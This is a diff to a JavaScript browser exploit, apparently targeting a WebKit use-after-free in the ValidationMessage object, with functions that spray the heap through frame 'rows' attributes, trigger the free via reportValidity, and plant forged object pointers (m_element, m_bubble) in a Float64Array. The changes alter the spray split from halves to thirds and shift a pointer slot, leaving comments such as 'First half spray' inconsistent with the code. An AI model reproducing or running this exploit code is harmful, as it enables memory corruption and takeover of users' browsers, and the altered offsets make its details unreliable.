@@ -324,7 +324,7 @@ function reuseTargetObj() {
 	 * Free ValidationMessage neighboors.
 	 * SmallLine is freed -> SmallPage is cached
 	 */
-	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
+	for (let i = NB_FRAMES / 3 - 0x10; i < NB_FRAMES / 3 + 0x10; i++)
 		g_frames[i].setAttribute("rows", ',');
 
 	/* Get back target object */
@@ -333,7 +333,7 @@ function reuseTargetObj() {
 		let view = new Float64Array(ab);
 
 		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
-		view[1] = guess_htmltextarea_addr.asDouble();   // m_bubble
+		view[2] = guess_htmltextarea_addr.asDouble();   // m_bubble
 
 		g_arr_ab_1.push(view);
 	}
@@ -395,14 +395,14 @@ function prepareUAF() {
 	div.appendChild(g_input);
 
 	/* First half spray */
-	for (let i = 0; i < NB_FRAMES / 2; i++)
+	for (let i = 0; i < NB_FRAMES / 3; i++)
 		g_frames[i].setAttribute("rows", g_rows1);
 
 	/* Instantiate target obj */
 	g_input.reportValidity();
 
 	/* ... and the second half */
-	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
+	for (let i = NB_FRAMES / 3; i < NB_FRAMES; i++)
 		g_frames[i].setAttribute("rows", g_rows2);
 
 	g_input.setAttribute("onfocus", "reuseTargetObj()");
